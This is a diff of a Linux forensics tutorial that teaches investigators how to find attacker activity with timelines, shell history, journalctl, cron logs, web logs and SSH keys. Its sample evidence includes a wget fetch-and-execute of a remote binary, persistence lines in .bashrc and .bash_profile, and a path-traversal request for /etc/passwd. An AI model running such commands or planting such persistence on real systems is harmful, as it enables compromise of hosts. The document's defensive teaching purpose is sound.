@@ -26,7 +26,7 @@ At this stage:
 ## Looking for evil
 
 Attackers leave breadcrumbs everywhere: program installation, execution, file modification, user account usage.<br />
-Investigators are looking for anything out of the ordinary. <br />
+Investigators are looking for anything out of the ordinary.<br />
 This implies taking time to learn what normal looks like.<br />
 
 ### Timeline analysis
@@ -95,7 +95,7 @@ Line	Tag	Timestamp	macb	Meta	File Name	File Size
 
 Note the example file shown above has one entry in the `bodyfile` but shows as two entries in the timeline.
 
-That is because `mactime` builds a chronological timeline, and the access time (seen as `.a..` in the macb column) for this file differred from the other three (seen as `m.cb`).
+That is because `mactime` builds a chronological timeline, and the access time for this file (seen as `.a..` in the macb column) differred from the other three (seen as `m.cb`).
 
 The bodyfile shows unique entries per file, and the timeline shows unique entries per time per file.
 
@@ -103,8 +103,7 @@ The bodyfile shows unique entries per file, and the timeline shows unique entrie
 
 ``` bash
 # the command history for a user shows evidence of previously executed commands
-# bash_history is the standard Unix shell command history
-# simple text file written when the terminal is closed
+# bash_history is the standard Unix shell command history, a simple text file written when the terminal is closed
 # can be easily deleted, though it's absence is an indicator of adversary activity
 # history may be suppressed by prefixing commands with a space (if HISTCONTROL=ignorespace)
 $ cat .bash_history
@@ -112,19 +111,27 @@ wget http://192.168.1.37/notmalware
 chmod +x notmalware
 ./notmalware
 
+# shell config files execute on login or interactive shell
+# check for unexpected additions
+$ tail .bash_profile
+(/tmp/.hidden/notmalware.sh >/dev/null 2>&1 &)
+$ tail .bashrc
+(~/notmalware >/dev/null 2>&1 &)
+
 # systemd journal can be filtered for entries since the last boot with timestamps in UTC
-journalctl --utc -b
+# we pass it the journal collected with UAC
+journalctl --file uac/\[root\]/var/log/journal/9fe98394f1ab41a8a40c2e0ea771cd59/system.journal --utc -b
 Jun 11 10:39:28 sss systemd[1]: Started session-49.scope - Session 49 of User sss.
 # filter for a specific executable
 # for example every sudo invocation is logged
-$ journalctl --utc _EXE=/usr/bin/sudo
+$ journalctl --file uac/\[root\]/var/log/journal/9fe98394f1ab41a8a40c2e0ea771cd59/system.journal --utc _EXE=/usr/bin/sudo
 Jun 11 11:24:20 sss sudo[312682]:      sss : TTY=pts/0 ; PWD=/home/sss ; USER=root ; COMMAND=./notmalware
 Jun 11 11:24:20 sss sudo[312682]: pam_unix(sudo:session): session opened for user root(uid=0) by sss(uid=1000)
 Jun 11 11:24:28 sss sudo[312682]: pam_unix(sudo:session): session closed for user root
 [..]
 
 # systemd journal shows evidence of execution via cron
-$ journalctl --utc -u cron
+$ $ journalctl --file uac/\[root\]/var/log/journal/9fe98394f1ab41a8a40c2e0ea771cd59/system.journal --utc -u cron
 Jun 11 14:35:02 sss CRON[312769]: pam_unix(cron:session): session closed for user root
 Jun 11 14:35:02 sss CRON[312775]: (sss) CMD (~/payload)
 Jun 11 14:36:01 sss CRON[312791]: pam_unix(cron:session): session opened for user sss(uid=1000) by sss(uid=0)
@@ -132,14 +139,6 @@ Jun 11 14:36:01 sss CRON[312792]: (sss) CMD (~/payload)
 Jun 11 14:37:01 sss CRON[312797]: pam_unix(cron:session): session opened for user sss(uid=1000) by sss(uid=0)
 Jun 11 14:37:01 sss CRON[312798]: (sss) CMD (~/payload)
 [..]
-
-# shell config files execute on login or interactive shell
-# check for unexpected additions
-$ tail .bash_profile
-(/tmp/.hidden/notmalware.sh >/dev/null 2>&1 &)
-$ tail .bashrc
-(/tmp/.hidden/notmalware.sh >/dev/null 2>&1 &)
-
 ```
 
 ### Evidence of past file presence
@@ -212,7 +211,7 @@ root             pts/1    192.168.1.15                     Tue Jun 10 16:55:02 +
 sss              pts/0    fe80::a60a:b442:fc61:8a15%ens33  Thu Jun 11 20:33:24 +0300 2026
 
 # check web server logs
-# they often document initial compromise
+# they often show initial access
 $ grep -v ' 200 \| 400 ' uac/\[root\]/var/log/apache2/access.log | head
 192.168.1.100 - - [10/Jun/2026:16:48:22 +0000] "GET /wp-admin/../../etc/passwd HTTP/1.1" 400 512
 192.168.1.100 - - [10/Jun/2026:16:48:31 +0000] "POST /upload.php HTTP/1.1" 200 128
@@ -248,7 +247,6 @@ Access: 2026-06-12 10:42:22.651286604 +0300
 Modify: 2026-06-12 10:42:14.880365073 +0300
 Change: 2026-06-12 10:42:14.880365073 +0300
  Birth: 2026-06-04 13:53:02.801996311 +0300
-# we check the contents and find an unexpected key
 $ cat uac/\[root\]/home/sss/.ssh/authorized_keys
 [..]
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN21TIWOoH2qDkPGZfL8MEdJa7qFGOW7dr60/s9UZhH2 admin
